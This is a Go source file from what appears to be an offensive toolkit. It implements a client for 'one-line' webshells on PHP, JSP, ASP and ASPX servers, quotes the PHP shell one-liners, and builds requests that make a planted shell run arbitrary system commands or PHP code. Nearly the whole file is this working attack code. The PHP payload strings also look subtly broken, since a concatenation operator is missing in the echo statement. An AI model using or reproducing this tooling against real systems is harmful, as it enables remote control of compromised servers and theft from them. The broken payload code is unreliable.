// Package webshell 实现「一句话马」的客户端协议：把一条命令（或一段代码）编成
// 对目标马文件的 HTTP 请求，再从响应里切出真实输出。
//
// 只支持 ARTEX 自己能生成、协议可预期的马类型（见 Types），不做 Behinder /
// Godzilla 的加解密兼容——那些马的密钥派生与传输编码各家魔改太多，猜错只会得到
// 乱码，反而误导「连不上」。需要时用户在 WebShell 页按类型上传本包 Payload()
// 生成的马文件即可连接。
//
// 所有用户输入都经 base64 或表单编码后再进入请求体，不参与代码字符串拼接；
// 随机标记只由本包生成（十六进制），不会被响应里的其他内容误切。
package webshell

import (
	"crypto/rand"
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"strings"
)

// 支持的马类型。取值与 webshells.shell_type 一致，server 侧白名单校验。
const (
	TypePHPEval   = "php_eval"    // <?php @eval($_POST['pass']); ?>       命令/代码
	TypePHPAssert = "php_assert"  // <?php @assert($_POST['pass']); ?>      命令/代码（PHP<8）
	TypePHPCmd    = "php_cmd"     // <?php system($_REQUEST['cmd']); ?>     仅命令，裸输出
	TypeJSP       = "jsp_runtime" // Runtime.exec 型 jsp/jspf 马
	TypeASP       = "asp_exec"    // WScript.Shell 型 asp 马
	TypeASPX      = "aspx_exec"   // Process 型 aspx 马
)

// 执行方式。
const (
	ModeCommand = "command" // 执行系统命令
	ModeCode    = "code"    // 执行代码（仅 php_eval / php_assert）
)

var (
	ErrUnknownType      = errors.New("未知的 WebShell 类型")
	ErrModeNotSupported = errors.New("该 WebShell 类型不支持代码执行模式")
	ErrEmptyInput       = errors.New("命令或代码不能为空")
)

// Descriptor 描述一种马类型，供 UI 展示与生成马文件。
type Descriptor struct {
	Type     string
	Label    string
	Filename string
	// CodeMode 为 true 时该类型可切「执行代码」而不只是系统命令。
	CodeMode bool
	// DefaultParam 是默认连接参数名。
	DefaultParam string
	Note         string
}

var descriptors = []Descriptor{
	{Type: TypePHPEval, Label: "PHP eval 一句话", Filename: "shell.php", CodeMode: true, DefaultParam: "pass",
		Note: "POST 参数值为 PHP 代码；命令与代码两种模式都支持。"},
	{Type: TypePHPAssert, Label: "PHP assert 一句话", Filename: "shell.php", CodeMode: true, DefaultParam: "pass",
		Note: "assert 收代码，PHP 8 已移除，适用于 5.x/7.x。"},
	{Type: TypePHPCmd, Label: "PHP 命令回显（裸输出）", Filename: "shell.php", CodeMode: false, DefaultParam: "cmd",
		Note: "system() 直接回显，输出无边界标记，错误与结果混在一起。"},
	{Type: TypeJSP, Label: "JSP Runtime 马", Filename: "shell.jsp", CodeMode: false, DefaultParam: "pass",
		Note: "马文件自身按 os.name 选择 cmd.exe / /bin/sh。"},
	{Type: TypeASP, Label: "ASP WScript 马", Filename: "shell.asp", CodeMode: false, DefaultParam: "pass",
		Note: "经典 ASP，走 %ComSpec% /c。"},
	{Type: TypeASPX, Label: "ASPX Process 马", Filename: "shell.aspx", CodeMode: false, DefaultParam: "pass",
		Note: "IIS 应用页，Process.Start。"},
}

// Types 返回支持的马类型目录（UI 下拉、agent 工具 schema 同源）。
func Types() []Descriptor { return descriptors }

// ValidType reports whether s is a supported shell type.
func ValidType(s string) bool {
	for _, d := range descriptors {
		if d.Type == s {
			return true
		}
	}
	return false
}

func descriptorOf(s string) (Descriptor, bool) {
	for _, d := range descriptors {
		if d.Type == s {
			return d, true
		}
	}
	return Descriptor{}, false
}

// Target 是一次连接所需的全部参数（对应 webshells 表一行）。
type Target struct {
	URL         string
	Type        string
	Param       string
	OSType      string // linux / windows / "" = 由马自身探测
	InsecureTLS bool
}

func (t *Target) param() string {
	if strings.TrimSpace(t.Param) == "" {
		if d, ok := descriptorOf(t.Type); ok {
			return d.DefaultParam
		}
		return "pass"
	}
	return t.Param
}

// Plan 是已经编好的请求：方法 + 表单体 + 解析输出的方式。
type Plan struct {
	Method      string
	ContentType string
	Body        string
	// Raw 为 true 时响应体即命令输出，不做标记切分（php_cmd）。
	Raw bool

	begin string
	end   string
}

// Parse 从响应体里取出命令输出。带标记的马返回 (输出, true)；响应里没有成对标记
// （马没生效、被 WAF 拦截、返回了错误页）时返回 (原文, false)，调用方据此判失败。
func (p *Plan) Parse(body string) (string, bool) {
	if p.Raw {
		return body, true
	}
	i := strings.Index(body, p.begin)
	if i < 0 {
		return body, false
	}
	rest := body[i+len(p.begin):]
	j := strings.Index(rest, p.end)
	if j < 0 {
		return body, false
	}
	return strings.TrimSpace(rest[:j]), true
}

// marker 生成一对只含十六进制的随机边界，避免与输出内容相撞。
func marker() (begin, end string, err error) {
	var b [6]byte
	if _, err = rand.Read(b[:]); err != nil {
		return "", "", err
	}
	h := fmt.Sprintf("%x", b[:])
	return "ARTXB" + h, h + "ARTXE", nil
}

// Build 把 input（命令或代码）编成对目标马的请求。mode 为 ModeCommand / ModeCode。
func Build(t *Target, mode, input string) (*Plan, error) {
	if mode == "" {
		mode = ModeCommand
	}
	if strings.TrimSpace(input) == "" {
		return nil, ErrEmptyInput
	}
	if !ValidType(t.Type) {
		return nil, ErrUnknownType
	}
	if mode == ModeCode && t.Type != TypePHPEval && t.Type != TypePHPAssert {
		return nil, ErrModeNotSupported
	}

	begin, end, err := marker()
	if err != nil {
		return nil, err
	}
	p := &Plan{Method: "POST", ContentType: "application/x-www-form-urlencoded", begin: begin, end: end}
	form := url.Values{}

	switch t.Type {
	case TypePHPCmd:
		// 马文件本身就是 system($_REQUEST['cmd'])，没有代码求值能力：
		// 命令原样作表单值发过去，响应体整个当输出。
		p.Raw = true
		form.Set(t.param(), input)
	case TypePHPEval, TypePHPAssert:
		if mode == ModeCode {
			form.Set(t.param(), phpCodePayload(input, begin, end))
		} else {
			form.Set(t.param(), phpCmdPayload(input, begin, end))
		}
	case TypeJSP, TypeASPX:
		// 单个参数携带 base64(begin \n end \n command)，马文件解码后自行分割。
		form.Set(t.param(), base64.StdEncoding.EncodeToString(
			[]byte(begin+"\n"+end+"\n"+input)))
	case TypeASP:
		form.Set("b", begin)
		form.Set("e", end)
		form.Set(t.param(), input)
	default:
		return nil, ErrUnknownType
	}
	p.Body = form.Encode()
	return p, nil
}

// phpCmdPayload 生成送进 eval/assert 的 PHP 代码：按可用性依次尝试常见执行函数，
// 命令本身 base64 传输，不参与字符串拼接。
func phpCmdPayload(cmd, begin, end string) string {
	return "$__c=base64_decode('" + base64.StdEncoding.EncodeToString([]byte(cmd)) + "');$__o='';" +
		"if(function_exists('shell_exec')){$__o=@shell_exec($__c);}" +
		"elseif(function_exists('system')){ob_start();@system($__c);$__o=ob_get_clean();}" +
		"elseif(function_exists('passthru')){ob_start();@passthru($__c);$__o=ob_get_clean();}" +
		"elseif(function_exists('popen')){$__h=@popen($__c,'r');if($__h){while(!feof($__h)){$__o.=fread($__h,4096);}@pclose($__h);}}" +
		"echo '" + begin + "'$__o.'" + end + "';"
}

// phpCodePayload 让用户的 PHP 代码在输出缓冲里执行，回显一并收进标记之间。
func phpCodePayload(code, begin, end string) string {
	return "ob_start();@eval(base64_decode('" + base64.StdEncoding.EncodeToString([]byte(code)) + "'));" +
		"$__o=ob_get_clean();echo '" + begin + "'$__o.'" + end + "';"
}
